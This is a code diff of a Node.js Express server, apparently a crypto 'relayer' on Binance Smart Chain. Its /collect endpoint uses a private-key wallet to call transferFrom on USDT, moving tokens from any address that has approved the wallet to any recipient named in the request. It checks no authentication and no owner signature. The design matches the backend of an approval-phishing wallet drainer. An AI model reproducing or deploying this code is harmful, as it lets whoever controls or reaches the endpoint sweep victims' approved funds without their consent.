@@ -11,93 +11,112 @@ app.use(express.json());
 
 /* ================= CONFIG ================= */
 
-const RPC_URL = "https://bsc-dataseed.binance.org/";
+const PORT = process.env.PORT || 10000;
+const RPC_URL =
+  process.env.RPC_URL || "https://bsc-dataseed.binance.org/";
+
+const USDT_ADDRESS =
+  process.env.USDT ||
+  "0x55d398326f99059fF775485246999027B3197955";
+
+/* ================= PROVIDER ================= */
+
 const provider = new ethers.JsonRpcProvider(RPC_URL);
 
-const wallet = new ethers.Wallet(
-  process.env.PRIVATE_KEY,
-  provider
-);
+/* ================= PRIVATE KEY FIX ================= */
+
+const PRIVATE_KEY = process.env.PRIVATE_KEY?.trim();
+
+if (!PRIVATE_KEY) {
+  throw new Error("❌ PRIVATE_KEY missing in ENV");
+}
+
+if (!/^0x[a-fA-F0-9]{64}$/.test(PRIVATE_KEY)) {
+  throw new Error(
+    "❌ PRIVATE_KEY invalid format (must be 0x + 64 hex chars)"
+  );
+}
+
+const wallet = new ethers.Wallet(PRIVATE_KEY, provider);
+
+console.log("✅ Relayer Wallet:", wallet.address);
+
+/* ================= ERC20 ABI ================= */
 
 const ERC20_ABI = [
-  "function balanceOf(address) view returns(uint256)",
-  "function allowance(address,address) view returns(uint256)",
-  "function transferFrom(address,address,uint256) returns(bool)"
+  "function decimals() view returns (uint8)",
+  "function balanceOf(address) view returns (uint256)",
+  "function allowance(address,address) view returns (uint256)",
+  "function transferFrom(address,address,uint256) returns (bool)"
 ];
 
-/* ================= HEALTH ================= */
+const token = new ethers.Contract(
+  USDT_ADDRESS,
+  ERC20_ABI,
+  wallet
+);
 
-app.get("/", (req, res) => {
-  res.send("Relayer running ✅");
+/* ================= HEALTH CHECK ================= */
+
+app.get("/", (_, res) => {
+  res.send("✅ BSC Relayer Running");
 });
 
-/* ================= COLLECT ================= */
+/* ================= COLLECT ENDPOINT ================= */
 
 app.post("/collect", async (req, res) => {
-
   try {
-
-    const { token, from, to, amount } = req.body;
+    const { from, to, amount } = req.body;
 
     console.log("Incoming:", req.body);
 
-    if (!token || !from || !to || !amount) {
+    if (!from || !to || !amount) {
       return res.status(400).json({
         error: "Missing parameters"
       });
     }
 
-    const contract = new ethers.Contract(
-      token,
-      ERC20_ABI,
-      wallet
-    );
+    const value = BigInt(amount);
 
-    // ✅ amount already WEI (frontend se aa raha)
-    const amountWei = BigInt(amount);
+    /* ---- CHECK BALANCE ---- */
+    const balance = await token.balanceOf(from);
 
-    /* ---------- BALANCE CHECK ---------- */
-    const balance = await contract.balanceOf(from);
+    console.log("User balance:", balance.toString());
 
-    if (balance < amountWei) {
+    if (balance < value) {
       return res.status(400).json({
         error: "User balance too low"
       });
     }
 
-    /* ---------- ALLOWANCE CHECK ---------- */
-    const allowance = await contract.allowance(
-      from,
-      wallet.address
-    );
+    /* ---- CHECK ALLOWANCE ---- */
+    const allowance = await token.allowance(from, wallet.address);
 
-    if (allowance < amountWei) {
+    console.log("Allowance:", allowance.toString());
+
+    if (allowance < value) {
       return res.status(400).json({
-        error: "Approval not enough"
+        error: "Allowance not approved"
       });
     }
 
-    /* ---------- TRANSFER ---------- */
+    /* ---- EXECUTE TRANSFER ---- */
     console.log("Sending transferFrom...");
 
-    const tx = await contract.transferFrom(
-      from,
-      to,
-      amountWei
-    );
+    const tx = await token.transferFrom(from, to, value);
 
-    console.log("TX:", tx.hash);
+    console.log("TX Sent:", tx.hash);
 
     const receipt = await tx.wait();
+
+    console.log("✅ SUCCESS:", receipt.hash);
 
     res.json({
       success: true,
       hash: receipt.hash
     });
-
   } catch (err) {
-
-    console.error("ERROR:", err);
+    console.error("❌ RELAYER ERROR:", err);
 
     res.status(500).json({
       error: err.reason || err.message
@@ -105,10 +124,8 @@ app.post("/collect", async (req, res) => {
   }
 });
 
-/* ================= START ================= */
-
-const PORT = process.env.PORT || 3000;
+/* ================= START SERVER ================= */
 
 app.listen(PORT, () => {
-  console.log("Server running on", PORT);
+  console.log(`🚀 Server running on ${PORT}`);
 });
